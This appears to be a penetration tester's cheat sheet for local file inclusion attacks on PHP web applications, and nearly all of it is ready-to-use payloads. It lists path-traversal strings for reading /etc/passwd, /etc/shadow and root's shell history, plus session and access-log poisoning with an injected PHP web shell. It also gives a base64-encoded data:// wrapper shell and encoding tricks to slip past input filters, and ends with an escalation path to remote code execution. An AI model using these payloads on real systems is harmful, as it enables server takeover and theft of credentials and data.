# read server files via path manipulation. escalate to rce.

## quick test payloads

basic file reads:
```
?file=/etc/passwd
?page=../../../etc/passwd
?include=../../../../etc/shadow
?lang=/var/log/apache2/access.log
```

common sensitive files:
```
/etc/passwd          # user accounts
/etc/shadow          # password hashes
/var/log/apache2/access.log  # web server logs
/var/lib/php/sessions/       # php session files
/proc/self/environ   # environment variables
/var/www/html/config.php     # app configuration
```

## php session poisoning

inject code into session, then include session file:

1. send php code in any parameter:
```
POST /app.php
session_data=<?php system($_GET['cmd']); ?>
```

2. include your session file:
```
?file=/var/lib/php/sessions/sess_[YOUR_PHPSESSID]&cmd=id
```

session id found in browser cookies.

## log poisoning

inject php code into access logs, then include log file:

1. send malformed request with php code:
```bash
nc target.com 80
<?php system($_GET['cmd']); ?>
```

2. include access log:
```
?file=/var/log/apache2/access.log&cmd=whoami
```

## php wrapper exploitation

**data wrapper rce:**
```php
# encode payload: <?php system($_GET['cmd']); ?>
# base64: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

**filter wrapper with data:**
```
?file=php://filter/convert.base64-decode/resource=data://text/plain,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=whoami
```

## filter bypass techniques

**path traversal variations:**
```
../../../etc/passwd
....//....//....//etc/passwd
..///////../../../etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**null byte injection (php < 5.3.4):**
```
?file=/etc/passwd%00
?file=../../../etc/passwd%00.jpg
```

**bypass path sanitization:**
```
# if ../ is filtered
....//....//....//etc/passwd

# mixed encodings
..%2f..%2f..%2fetc%2fpasswd
..%5c..%5c..%5cetc%5cpasswd
```

**bypass file extension appending:**
```
# if .php is auto-appended
/etc/passwd/.
/etc/passwd/..
/etc/passwd%00
```

## file discovery

common php configuration paths:
```
/var/www/html/config.php
/var/www/config/database.php
/etc/apache2/sites-enabled/000-default
/home/user/.bashrc
/root/.bash_history
```

log file locations:
```
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/mail.log
/var/log/syslog
```

session directories:
```
/var/lib/php/sessions/
/tmp/
/var/tmp/
```

## operational notes

- [!] log poisoning affects all users - test carefully
- session poisoning requires valid session cookie
- php wrappers need `allow_url_include=On`
- error messages reveal file paths and restrictions
- always try multiple encoding methods for filters

**escalation path:**
1. find lfi vulnerability
2. attempt direct file reads for sensitive data
3. try session/log poisoning for rce
4. use php wrappers if url includes enabled

# TODO: add windows lfi payloads and file paths